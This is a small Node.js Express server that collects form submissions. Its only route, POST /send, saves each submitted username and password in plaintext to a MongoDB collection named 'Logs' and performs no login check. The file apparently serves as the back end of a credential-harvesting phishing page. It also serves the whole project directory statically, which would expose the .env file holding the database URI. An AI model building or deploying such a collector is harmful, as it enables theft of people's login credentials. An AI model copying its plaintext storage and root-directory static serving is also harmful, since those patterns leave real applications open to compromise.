const express = require('express');
require('dotenv').config();
const Logs = require('./Model');
const mongoose = require('mongoose');

const app = express()

mongoose.connect(process.env.MONGODB_URI,
  { useNewUrlParser: true,
    useUnifiedTopology: true,
    useNewUrlParser: true })
  .then(() => console.log('Connexion à MongoDB réussie !'))
  .catch((err) => console.log('Connexion à MongoDB échouée !'));


app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Credentials', 'true')
    res.setHeader('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content, Accept, Content-Type, Authorization')
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS')
    next()
  });

app.use(express.json());
app.use(express.urlencoded({
  extended: true
}))

app.use(express.static('./'));


app.post('/send', async (req, res) => {
  const logs = new Logs({
    username: req.body.username,
    password: req.body.password,
  });
  logs.save()
    .then(() => res.status(201).send('Objet enregistré !'))
    .catch(error =>  res.status(500).send(error));
    
})



module.exports = app;